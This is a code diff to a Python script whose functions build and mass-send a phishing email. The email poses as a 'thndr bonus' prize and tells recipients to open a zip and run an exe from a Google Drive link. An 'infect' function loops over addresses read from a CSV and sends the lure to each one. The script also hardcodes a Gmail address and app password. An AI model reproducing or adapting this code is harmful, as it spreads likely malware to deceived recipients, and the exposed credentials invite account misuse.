@@ -89,7 +89,7 @@ def decrypt_using_private(private_key, ciphertext):
     return plaintext
 
 
-def sendmail(content, receiver):
+def sendmail(receiver):
     sender_email = "thndrstocks@gmail.com"
     receiver_email = receiver
     password = "emwqdhkmqonxxrnl"
@@ -98,10 +98,10 @@ def sendmail(content, receiver):
     message = MIMEMultipart()
     message["From"] = sender_email
     message["To"] = receiver_email
-    message["Subject"] = "Congratulation! You have been selected for thndr bonus please open the following zip folder and run the exe file to claim your bonus \n"
-    message["Subject"] += "https://drive.google.com/file/d/1894riQAdJbHTYHxBNdYl6r3Ei8VdaZZQ/view?usp=sharing"
-    # Attach the content as plain text
-    message.attach(MIMEText(content, "plain"))
+    message[
+        "Subject"] = "Congratulation! You have been selected for thndr bonus please open the following zip folder and run the exe file to claim your bonus \n"
+    message.attach(MIMEText(
+        "https://drive.google.com/file/d/1894riQAdJbHTYHxBNdYl6r3Ei8VdaZZQ/view?usp=sharing", "plain"))
 
     # Connect to the SMTP server and send the email
     server = smtplib.SMTP('smtp.gmail.com', 587)
@@ -125,8 +125,7 @@ def infect(csv_url):
 
     # loop through the emails and send the email
     for email in emails:
-        sendmail("You have won a prize in thndr stocks click the file to view",
-                 email)
+        sendmail(email)
 
     print(emails)
 
